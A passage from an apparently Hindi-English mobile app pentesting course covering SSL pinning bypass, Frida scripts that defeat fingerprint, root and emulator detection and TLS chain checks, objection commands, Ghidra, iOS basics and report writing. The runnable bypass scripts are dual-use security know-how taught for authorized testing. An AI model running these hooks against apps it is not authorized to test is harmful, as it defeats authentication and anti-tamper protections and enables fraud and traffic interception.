- **Androidunpinner:** Python tool jo objection ki tarah patch karta hai, specifically SSL pinning bypass ke liye.

#### 💻 6. Hands-On: The Hacker's Toolkit
**APK-MITM:**
1. Install: `npm install -g apk-mitm`
2. Run: `apk-mitm app.apk`
   - Ye `app-patched.apk` banayega.
3. Install patched APK, Burp certificate install karo, traffic intercept karo.

**Androidunpinner:**
1. Clone: `git clone https://github.com/mateuszk87/AndroidUnpinner`
2. Install requirements.
3. Run: `android-unpinner all app.apk`
4. Patched APK install karo.

#### ⚖️ 7. Comparison
- APK-MITM: Specifically network security config modify karta hai, simple.
- Androidunpinner: Multiple methods try karta hai.

#### 📝 14. Summary
**APK-MITM & Androidunpinner – SSL pinning bypass ke “automatic wizards”!** 🧙

---

### 🎯 1. Title / Topic: **Module 7.9 – Bypassing Fingerprint Authentication**

#### Beginner Clarification
- FingerprintManager and BiometricPrompt API generation differences samajhna zaruri hai.
- Frida bypass scripts me app ke actual callback path ke hisab se hooks adjust karo.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Kuch apps fingerprint use karti hain login ke liye. Par fingerprint check ka result `false` ya `0` hota hai galat fingerprint ke liye. Hum Frida se response `true` kar sakte hain – jisse app sochegi fingerprint sahi hai, chahe galat ho.

#### 📖 3. Technical Definition
Fingerprint authentication Android ke `FingerprintManager` ya `BiometricPrompt` API se implement hoti hai. Success callback mein `onAuthenticationSucceeded` aata hai. Frida hook karke `onAuthenticationFailed` ko `onAuthenticationSucceeded` mein badal sakte hain, ya return value manipulate kar sakte hain.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Frida Script example (`fingerprint.js`):**
```javascript
Java.perform(function() {
    var FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
    FingerprintManager.authenticate.implementation = function(crypto, cancel, flags, callback, handler) {
        console.log('Fingerprint auth called, bypassing...');
        // Call original but modify callback?
        // Better: Hook the callback directly
        // Alternative: Override onAuthenticationFailed
        this.authenticate(crypto, cancel, flags, callback, handler);
    };

    // Hook the callback class
    var FingerprintManagerAuthenticationCallback = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationCallback');
    FingerprintManagerAuthenticationCallback.onAuthenticationFailed.implementation = function() {
        console.log('onAuthenticationFailed hooked, converting to success');
        this.onAuthenticationSucceeded(null); // Dummy result
    };
});
```

**Steps:**
1. Install frida-tools.
2. Get package name: `frida-ps -Ua`
3. Run script: 
   ```bash
   frida -U -f com.example.app -l fingerprint.js
   ```
4. App fingerprint prompt aane par koi bhi finger rakh do – script success bana dega.

#### ⚖️ 7. Comparison: Frida vs Objection
- Objection mein direct command nahi hai fingerprint bypass ke liye. Frida script likhni padti hai.

#### 🚫 8. Common Mistakes
- Callback class ka sahi path dhundhna important hai.
- Android version ke hisaab se API change ho sakti hai (BiometricPrompt vs FingerprintManager).

#### 📝 14. Summary
**Fingerprint bypass – Frida se “false” ko “true” bana do!** 👆

---

**Ye raha Phase 2!** Isme humne cover kiya:
- Exported activities exploitation
- Cyberchef basics
- MobSF static & dynamic analysis
- Burp suite setup
- SSL pinning bypass via objection, manual patching, APK-MITM
- Objection commands for dynamic analysis
- Frida codeshare
- SharedPreferences analysis
- PIDCat
- Fingerprint bypass

Agli phase (Phase 3) mein hum advanced topics jaise:
- Root detection bypass techniques
- Custom Frida scripts
- Emulator vs real device nuances
- Advanced reverse engineering (Ghidra for native libs)
- iOS basics

Ya fir kuch specific topic chahiye to batao!

**Ethics yaad rakhna:** Sab kuch sirf educational hai, apni apps ya authorized targets par test karo. Gadget injection se phone brick nahi hoga, lekin app crash ho sakti hai – backup rakhna. Happy hacking! 😎


=====================================================================


## Phase 3: Advanced Dynamic Analysis & Platform Nuances

---

### 🎯 1. Title / Topic: **Module 8.1 – Mobexler: The All-in-One Mobile Pentesting Platform**

#### Beginner Clarification
- VM network mode choice important hai.
- NAT me device to VM direct reachability issues aa sakte hain.
- Bridged mode mobile proxy lab ke liye generally better hota hai.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Mobexler ek "Swiss Army knife" hai mobile pentesting ke liye. Jaise ek bag mein saare zaroori tools rakh lo – Burp, ADB, Frida, MobSF, sab pre-configured. Aap bas platform boot karo aur kaam shuru karo, alag se tool install karne ki tension nahi.

#### 📖 3. Technical Definition
**Mobexler** ek pre-configured virtual machine (VM) based platform hai jo specifically Android aur iOS app penetration testing ke liye design kiya gaya hai. Isme pehle se saare essential tools installed aur configured aate hain, jaise Burp Suite, ADB, Frida, Objection, APKTool, JADX, MobSF, aur bhi bahut kuch. Tester bas VM chalaye aur turant testing shuru kar de.

#### 🧠 4. Zaroorat Kyun Hai?
- **Vulnerability:** Tester ke time ki bachat – environment setup mein ghante nahi lagenge.
- **Security:** Pre-configured tools ensure karte hain ki koi missing configuration na ho, jaise Burp proxy sahi se set ho.

#### ⚙️ 5. Under the Hood
Mobexler ek Linux-based VM (usually VirtualBox/VMware image) hota hai. Isme scripts aur configs pehle se daali gayi hain jo tools ko properly link karti hain. Jaise Burp Suite mein CA certificate export karke Android device mein install karne ke liye instructions diye hote hain.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Steps to use Mobexler:**
1. Google se "Mobexler download" search karo aur official website se VM image download karo.
2. VirtualBox ya VMware mein image import karo.
3. VM start karo. Login credentials provided hote hain (usually user: `mobexler`, pass: `mobexler`).
4. Desktop par shortcuts dikhenge – Burp, Frida-server, etc.
5. Android device ko VM se connect karo (USB passthrough ya network).
6. Tools use karo jaise:
   - Burp Suite: proxy already set hai, bas device ko VM ke IP par proxy set karo.
   - Frida: `frida-server` already running hoga ya start kar sakte ho.
   - MobSF: browser mein localhost par open karo.

**Note:** Mobexler mein documentation bhi hoti hai, padh lo.

#### ⚖️ 7. Comparison: Mobexler vs Manual Setup
- **Manual Setup:** Flexibility, but time-consuming, configuration errors possible.
- **Mobexler:** Instant setup, but VM performance overhead, limited customization.

#### 🚫 8. Common Mistakes
- VM network settings sahi na hona (bridge vs NAT) – device aur VM same network mein hone chahiye.
- USB passthrough issues – VirtualBox extension pack install karo.
- Tool versions outdated ho sakte hain – manually update karna padega.

#### 🌍 9. Real-World Use Case
Bug bounty hunter ko ek naya device mila, usne turant Mobexler boot kiya, device connect kiya, aur 10 minute mein app analysis shuru kar diya.

#### 🛠️ 11. Best Practices
- VM snapshots le lo before major changes.
- Shared folders use karo to transfer APKs.

#### 📝 14. Summary
**Mobexler – “ready-to-hack” VM, bas power on karo aur kaam shuru!** ⚡

---

### 🎯 1. Title / Topic: **Module 8.2 – Root Detection & Bypass Techniques**

#### Beginner Clarification
- Magisk Hide legacy term hai; modern flows me Zygisk plus denylist approach use hoti hai.
- Runtime bypass tools temporary help dete hain, persistent hide config alag cheez hai.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Rooted device ko app "tampered" samajhti hai aur mana kar deti hai. Jaise ek shop par "No Shoes" ka board ho, to barefoot nahi ja sakte. Lekin hum mozze pehen kar (bypass techniques) andar ghus sakte hain.

#### 📖 3. Technical Definition
**Root Detection** wo mechanisms hain jinse app pata karti hai ki device rooted hai ya nahi. Common checks:
- `su` binary existence check
- Test-keys build properties
- Root management apps (SuperSU, Magisk) ki presence
- Writable system partition
- Dangerous commands execution

**Bypass** ka matlab in checks ko fool karna – ya to return values modify karo (Frida se) ya environment hide karo (Magisk Hide).

#### 🧠 4. Zaroorat Kyun Hai?
- **Vulnerability:** Agar app root detection sirf client-side hai, to hacker rooted device par bhi app chala sakta hai aur sensitive areas access kar sakta hai.
- **Security:** Developer root detection lagata hai taoki rooted devices par app na chale (banking apps), kyunki root par security compromise ho sakti hai.

#### ⚙️ 5. Under the Hood & Target Anatomy
**Common detection methods:**
- `Runtime.exec("which su")` – check for su binary.
- `Build.TAGS` contains "test-keys"?
- Check for files: `/system/app/Superuser.apk`, `/sbin/su`, `/system/xbin/daemonsu`, etc.
- Check if `/system` partition is mounted as writable.
- Use `RootBeer` library.

**Bypass approach:** Hook the methods that return boolean for root status.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Using Objection:**
```bash
objection --gadget com.example.app explore
```
Then:
```
android root disable
```
Ye root detection bypass kar dega (common checks).

**Using Frida script:**
```javascript
Java.perform(function() {
    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
    RootBeer.isRooted.implementation = function() {
        console.log('RootBeer.isRooted called, returning false');
        return false;
    };
    
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getPath();
        if (path.indexOf('su') >= 0 || path.indexOf('magisk') >= 0) {
            console.log('File.exists check for ' + path + ' returning false');
            return false;
        }
        return this.exists();
    };
});
```

**Steps:**
1. Attach Frida to app.
2. Load script or use objection command.
3. App ab rooted device par bhi chalegi.

#### ⚖️ 7. Comparison: Objection `android root disable` vs Custom Frida
- Objection: Quick, but might miss some advanced checks.
- Custom Frida: Full control, target specific checks.

#### 🚫 8. Common Mistakes
- Root detection bypass ke baad bhi app fail ho sakti hai agar server-side validation ho.
- Multiple detection methods ko individually bypass karna padta hai.

#### 🌍 9. Real-World Use Case
Banking app rooted device par block ho raha tha. Hacker ne objection se bypass kiya, login kiya, aur traffic intercept karke sensitive data leak kiya.

#### 🛠️ 11. Best Practices
- **For Pentesters:** Bypass ke baad bhi app ki functionality thoroughly test karo.
- **For Developers:** Server-side bhi validation karo (e.g., safety net attestation).

#### 📝 14. Summary
**Root detection bypass – “root hai toh kya hua, app ko khabar nahi hone dunga!”** 🤫

---

### 🎯 1. Title / Topic: **Module 8.3 – Writing Custom Frida Scripts for Android**

#### Beginner Clarification
- Overloaded methods hook karne ke liye exact overload signature dena padta hai.
- Same method name ke int or string or double versions separately handle karne hote hain.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Objection ne pre-built commands diye, lekin kabhi kabhi specific functionality ke liye custom script likhni padti hai. Jaise "is particular button ko disable karo" ya "server response modify karo". Frida scripts wo tailor-made tools hain.

#### 📖 3. Technical Definition
**Frida** ek dynamic instrumentation toolkit hai jo JavaScript (ya Python) mein scripts likhne deta hai. Ye scripts app ke process mein inject ho kar memory read/write, function hooking, parameter modification, etc. kar sakti hain.

#### 🧠 4. Zaroorat Kyun Hai?
- **Vulnerability:** Koi specific vulnerability exploit karne ke liye (e.g., method argument change karke privilege escalation).
- **Security:** Testing specific scenarios jo pre-built tools cover nahi karte.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Frida Script Basics:**
```javascript
// Hook a method and log arguments
Java.perform(function() {
    var MainActivity = Java.use('com.example.app.MainActivity');
    MainActivity.checkLogin.implementation = function(username, password) {
        console.log('checkLogin called with: ' + username + ', ' + password);
        // Call original and get result
        var result = this.checkLogin(username, password);
        console.log('Result: ' + result);
        return result; // ya modify kar ke return karo
    };
});
```

**Common patterns:**
- Overload handling: agar same name ke multiple methods hain to `overload` specify karo.
- Return value modification.
- Calling original method with modified args.
- Instantiating objects.
- Accessing fields.

**Example: Bypass SSL Pinning manually:**
```javascript
Java.perform(function() {
    var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
        console.log('TrustManagerImpl.verifyChain called, bypassing');
        return untrustedChain; // return chain as verified
    };
});
```

**Steps to run:**
```bash
frida -U -f com.example.app -l myscript.js
```

#### ⚖️ 7. Comparison: Frida vs Xposed
- **Frida:** No reboot, runtime injection, easier to write, cross-platform.
- **Xposed:** Requires reboot, more powerful but limited to rooted devices.

#### 🚫 8. Common Mistakes
- Wrong class/method name – use JADX to find correct signatures.
- Not handling overloads.
- Forgetting `Java.perform()` wrapper.
- Script mein syntax error – use `frida` command line to see errors.

#### 🌍 9. Real-World Use Case
Hacker ne custom script likhi jo `onClick` listener hook karke "Buy" button ko bypass kiya bina payment ke.

#### 🛠️ 11. Best Practices
- Start with simple logs, then add modifications.
- Use `Java.choose()` to enumerate instances if needed.

#### 📝 14. Summary
**Custom Frida scripts – jab pre-built tools kaam na kare, toh apna “jaadu” likho!** ✨

---

### 🎯 1. Title / Topic: **Module 8.4 – Emulator Detection & Bypass**

#### Beginner Clarification
- Emulator bypass me Build class ke multiple fields and system properties spoof karne padte hain.
- Sirf model change karna enough nahi hota; brand, fingerprint, hardware keys bhi check hoti hain.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
App ko pata chal jata hai ki wo emulator mein chal rahi hai (like Android Studio emulator), toh wo mana kar deti hai. Hacker chahta hai emulator mein bhi app chale, to detection bypass karna hoga.

#### 📖 3. Technical Definition
**Emulator Detection** wo techniques hain jinse app pata karti hai ki wo real device mein chal rahi hai ya virtual. Common checks:
- Build properties: `ro.product.model`, `ro.hardware` (e.g., "sdk_phone").
- Telephony manager: IMEI null ya fixed values.
- Files: `/system/bin/qemud`, `init.goldfish.rc`.
- Sensors: missing hardware sensors.
- Network interfaces (e.g., `eth0` instead of `wlan0`).

#### 🧠 4. Zaroorat Kyun Hai?
- **Vulnerability:** Agar app emulator detection bypass ho jaye, to hacker emulator mein automated testing ya reverse engineering kar sakta hai without physical device.
- **Security:** Developers emulator detection lagate hain taoki app real device par hi chale (e.g., banking apps).

#### ⚙️ 5. Under the Hood
App `Build` class ya `System.getProperty` se properties read karti hai. Kuch apps native code mein bhi detection karti hain.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Using Frida to bypass:**
```javascript
Java.perform(function() {
    var Build = Java.use('android.os.Build');
    Build.MODEL.value = 'SM-G960F'; // real device model
    Build.MANUFACTURER.value = 'samsung';
    Build.HARDWARE.value = 'qcom';
    Build.BRAND.value = 'samsung';
    Build.DEVICE.value = 'starlte';
    Build.PRODUCT.value = 'starltexx';

    var BuildProperties = Java.use('android.os.SystemProperties');
    BuildProperties.get.overload('java.lang.String').implementation = function(key) {
        var value = this.get(key);
        if (key.indexOf('ro.kernel.qemu') >= 0) {
            return '0'; // not emulator
        }
        return value;
    };
});
```

**Using objection:** Objection ka `android emulator disable` command hai jo common checks bypass karta hai.

#### ⚖️ 7. Comparison: Emulator vs Real Device
- **Emulator:** Free, scalable, can snapshot, but slow, lacks sensors.
- **Real Device:** Accurate, but expensive, many variants needed.

#### 🚫 8. Common Mistakes
- Sirf build properties change karna kaafi nahi, native checks bhi ho sakte hain.
- App server-side bhi detect kar sakti hai (e.g., safety net).

#### 🌍 9. Real-World Use Case
Hacker ne emulator pe app run kiya, traffic capture kiya, aur vulnerable endpoint dhundh liya.

#### 📝 14. Summary
**Emulator detection bypass – app ko “fake locket” mein bhi real device ka jhooth dikhao!** 📱

---

### 🎯 1. Title / Topic: **Module 8.5 – Native Code Analysis with Ghidra (Intro)**

#### Beginner Clarification
- Java_ prefixed native symbols JNI mapping represent karte hain.
- Format se package, class, method decode karke native path trace kiya ja sakta hai.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Jab app ka sensitive logic C/C++ (native library) mein chhupa ho, to Java decompile karne se kuch nahi milega. Ghidra wo tool hai jo native library (`.so` file) ko disassemble karta hai aur C-like pseudo-code banata hai, taki hum samajh sakein ki native code kya kar raha hai.

#### 📖 3. Technical Definition
**Ghidra** ek open-source reverse engineering framework hai (developed by NSA). Ye binary files ko disassemble/decompile karta hai, control flow graph banata hai, aur analysis tools provide karta hai. Android native libraries (`.so` files) ARM/x86 assembly mein hoti hain, Ghidra unhe readable C code mein badalne ki koshish karta hai.

#### 🧠 4. Zaroorat Kyun Hai?
- **Vulnerability:** Native code mein bhi vulnerabilities ho sakti hain (buffer overflow, hardcoded keys, custom encryption). Unhe dhundhne ke liye Ghidra.
- **Security:** Developers sensitive code native mein daalte hain taaki reverse engineering mushkil ho.

#### ⚙️ 5. Under the Hood & Target Anatomy
**File:** `lib/armeabi-v7a/*.so`, `lib/arm64-v8a/*.so`
- **Purpose:** Native code ko execute karta hai (NDK).
- **Hacker kya dhundhta hai?** Hardcoded strings, encryption functions, key generation logic.
- **Consequence:** Agar native code vulnerable ho, to app ka security completely bypass ho sakta hai.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Steps:**
1. APK se native library extract karo (unzip APK, lib folder).
2. Ghidra install karo aur open karo.
3. New project create karo, import `.so` file.
4. Analyze karo (auto-analysis).
5. Functions explore karo. Decompiler window mein pseudo-C code dekho.
6. Search for strings (Window → Defined Strings).
7. Look for suspicious functions (e.g., `Java_...` functions jo Java se call hote hain).

**Example:** Agar app native mein AES encrypt kar rahi hai, to s_box ya key schedule dhundh sakte ho.

#### ⚖️ 7. Comparison: Ghidra vs IDA Pro
- **Ghidra:** Free, open-source, collaborative, decompiler good.
- **IDA Pro:** Paid, industry standard, more polished but expensive.

#### 🚫 8. Common Mistakes
- Ghidra ka decompiler perfect nahi hai, manual assembly check karna padta hai.
- Architecture galat select kiya (ARM vs x86) – analysis fail.
- Function signatures nahi pata to analysis mushkil.

#### 🌍 9. Real-World Use Case
Banking app ka encryption key native code mein hardcoded tha. Ghidra se key mil gayi, aur attacker ne user data decrypt kar liya.

#### 🛠️ 11. Best Practices
- Combine with dynamic analysis (Frida) to verify native function behavior.
- Use Ghidra's scripting to automate searches.

#### 📝 14. Summary
**Ghidra – native code ka “GST” jiska koi chhupa raheez nahi!** 🔎

---

### 🎯 1. Title / Topic: **Module 8.6 – iOS Basics for Android Hackers**

#### Beginner Clarification
- Jailbreak types: tethered, untethered, semi-tethered, semi-untethered.
- Reboot behavior difference pentest lab planning me directly impact karta hai.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Android seekh liya, ab iOS ki baari. iOS thoda zyada "bhadk" hai – locked system, sandbox strict, lekin wahan bhi pentesting possible hai. Samajh lo Android "khula bazaar" hai, iOS "mall" hai – rules alag, lekin andar ghusne ke raaste hain.

#### 📖 3. Technical Definition
**iOS Pentesting** mein hum iPhone/iPad apps ko analyze karte hain. iOS apps Objective-C ya Swift mein likhi jati hain, IPA files mein bundle hoti hain. Tools: Frida (iOS bhi support), Objection, Burp, etc. Jailbreak required for most dynamic analysis (or using non-jailbroken with some limitations).

#### 🧠 4. Zaroorat Kyun Hai?
- **Vulnerability:** iOS apps bhi vulnerabilities se bhari hoti hain – insecure storage, improper session handling, etc.
- **Security:** Developers iOS ko "secure" samajhte hain, lekin galtiyan karte hain.

#### ⚙️ 5. Under the Hood
iOS apps sandbox mein chalti hain. Data storage: `NSUserDefaults`, Keychain, SQLite. IPC through URL schemes, app extensions. Reverse engineering: class-dump, Hopper, Ghidra (for binaries). Dynamic: Frida, objection.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Key differences from Android:**
- **Package format:** IPA (instead of APK). `unzip` karo to `.app` bundle milta hai.
- **Binary:** Mach-O format (instead of DEX).
- **Tools:**
  - `frida-ps -Uai` – list iOS apps.
  - Objection: `objection patchipa` (for patching IPA).
  - `ipa install` via `ios-deploy`.
  - **Keychain dumper** (jailbroken) for Keychain data.
  - **Burp setup:** iOS mein CA certificate install karna alag process hai (Profile install).
- **Jailbreak detection:** Common, Frida se bypass.

**Basic commands:**
```bash
# List apps
frida-ps -Uai

# Attach objection
objection --gadget <bundle-id> explore

# Disable jailbreak detection
ios jailbreak disable
```

#### ⚖️ 7. Comparison: Android vs iOS Pentesting
- **Android:** Easier to get APK, decompile, modify; many tools.
- **iOS:** Need jailbreak for full access; binaries encrypted (FairPlay), need decryption (e.g., frida-ios-dump). More restricted.

#### 🚫 8. Common Mistakes
- Forgetting to install the correct CA certificate profile.
- Running iOS commands on Android context (objection commands differ: `ios` prefix).
- Not checking if app is encrypted (needs decryption first).

#### 🌍 9. Real-World Use Case
iOS banking app insecure data storage – developer saved session token in NSUserDefaults. Hacker (jailbroken) used objection to dump NSUserDefaults and stole token.

#### 🛠️ 11. Best Practices
- Use jailbroken device for testing, but be aware of iOS version.
- For non-jailbroken, use Frida Gadget injection via repackaging (similar to Android).

#### 📝 14. Summary
**iOS pentesting – Android ke baad naya “jungle”, lekin tools same hain!** 🍏

---

**Phase 3 complete!** Isme humne cover kiya:
- Mobexler – ready-to-use VM
- Root detection bypass
- Custom Frida scripting
- Emulator detection bypass
- Native code analysis with Ghidra
- iOS basics

Ab aap ek well-rounded mobile pentester banne ke raaste par ho. Yaad rakhna:
- Ethics first – sirf apne ya authorized apps par test karo.
- Practice makes perfect – Injured Android, Damn Vulnerable iOS app, etc.
- Tools sirf madadgar hain, real knowledge hai logic samajhna.

**Koi specific topic chhut gaya? Batao, turant add kar dunga!** 💪


===========================================================================

Phase 4: Professional & Advanced Topics


### 🎯 1. Title / Topic: **Module 9.1 – Writing Pentest Reports: The Final Weapon**

#### Beginner Clarification
- Official CVSS calculator use karo: first.org cvss 3.1 calculator.
- Base metrics choose karte waqt AV, AC, PR, UI, S, C, I, A clearly map karo.
- Report me sample vector include karna reproducibility improve karta hai.
🐣 2. Samjhane ke liye (Simple Analogy)
Pentesting ke baad report wo "school ki report card" hai jahan tum batate ho ki student (app) kaise perform kiya, kahan fail hua (vulnerabilities), aur kaise improve kare (remediation). Client ko sirf vulnerabilities nahi, balki unka business impact samajhna hota hai. Agar report weak hai, to poora pentest bekar.

📖 3. Technical Definition
Penetration Testing Report ek formal document hai jo testing methodology, findings (vulnerabilities), evidence (screenshots/commands), risk ratings, aur remediation recommendations provide karta hai. Isme executive summary technical details, aur detailed technical appendix hota hai.

🧠 4. Zaroorat Kyun Hai?
Vulnerability: Without proper report, client ko pata nahi chalega ki kya fix karna hai.

Security: Report developers ko guide karti hai ki security bugs kaise theek karein.

⚙️ 5. Report Structure
Executive Summary: Non-technical overview for management.

Scope & Methodology: Kya test kiya, kaise kiya (tools, techniques).

Risk Rating: Critical, High, Medium, Low – CVSS score.

Findings Table: List of vulnerabilities with quick status.

Detailed Findings: For each finding:

Title, CVSS Score, Impact

Description (what is the issue)

Steps to Reproduce (PoC with commands/screenshots)

Remediation (how to fix)

Appendix: Tool versions, commands used, etc.

💻 6. Hands-On: The Hacker's Toolkit
Example Finding Structure:

text
# Vulnerability Title: Hardcoded API Key in AndroidManifest.xml

**CVSS Score:** 7.5 (High)
**Impact:** Attacker can extract API key and access backend services.

**Description:** The application contains a hardcoded API key in the AndroidManifest.xml file under <meta-data> tag.

**Steps to Reproduce:**
1. Decompile the APK using JADX-GUI.
2. Open AndroidManifest.xml.
3. Search for "api_key" – found value "AIzaSyD..."
4. Validate by accessing `https://api.google.com/maps?key=AIzaSyD...` – returns valid response.

**Remediation:**
- Remove hardcoded key.
- Use Android Keystore system.
- Fetch key from backend at runtime with proper authentication.
Tools for report writing:

Markdown for structure (convert to PDF later).

Pandoc to convert to PDF/Word.

Screenshots: Clean, annotated.

Burp Suite save requests/responses.

⚖️ 7. Comparison: Executive Summary vs Technical Report
Executive Summary: For managers – short, impact-focused.

Technical Report: For developers – detailed, step-by-step.

🚫 8. Common Mistakes
Boring, unstructured report.

No proof of concept (PoC) – just saying "vulnerability exists" without evidence.

Risk rating wrong (critical ko medium likh diya).

Remediation vague ("fix the bug").

🌍 9. Real-World Use Case
Bug Bounty Payout: Ek hacker ne report itni acchi likhi ki company ne $10,000 bounty di. Report mein clear steps, impact analysis, aur fix suggestion tha.

🛠️ 11. Best Practices
For Pentesters: Template use karo, screenshots lo, commands copy karo, impact clearly batao.

For Developers: Report ko reproduce karo, fix implement karo.

❓ 13. FAQ
Q: Report mein CVSS score kaise calculate karein?
A: Use CVSS calculator. Base metrics: Attack Vector, Complexity, Privileges, User Interaction, Scope, Confidentiality, Integrity, Availability.

Q: Ek finding ko kya likhna chahiye?
A: Title, CVSS, Description, Steps to Reproduce, Remediation.

Q: Report kitni detailed honi chahiye?
A: Itni ki developer bina confusion ke fix kar paye.

📝 14. Summary
Pentest Report – tumhara “legal weapon”, jisse app secure banti hai! 📄


=====================================================================================
